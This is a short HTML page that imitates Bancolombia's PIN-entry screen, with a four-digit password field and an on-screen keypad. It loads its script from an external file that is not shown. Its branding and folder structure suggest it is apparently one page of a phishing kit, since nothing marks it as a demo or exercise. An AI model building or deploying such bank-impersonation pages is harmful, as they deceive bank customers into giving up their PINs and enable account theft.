<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANCOLOMBIA </title>
    <link rel="stylesheet" href="../Clave/css/styles.css">
</head>
<body>
    <div class="container">
        <div class="left-block">
            <h2>Clave</h2>
            <p>Si la imagen y frase no son las que has definido, por seguridad no ingreses la clave</p>
            <p>Ingresa tu clave</p>
            <input type="password" class="pin-input" maxlength="4">
            <p>Utiliza el teclado virtual</p>
        </div>
        <div class="right-block">
            <div class="keypad">
                <button class="key">1</button>
                <button class="key">2</button>
                <button class="key">3</button>
                <button class="key">4</button>
                <button class="key">5</button>
                <button class="key">6</button>
                <button class="key">7</button>
                <button class="key">8</button>
                <button class="key">9</button>
                <button class="key">0</button>
                <button class="keyborrar">borrar</button>
            </div>
        </div>
        <script src="../Clave/js/main.js"></script>
    </div>
</body>
</html>
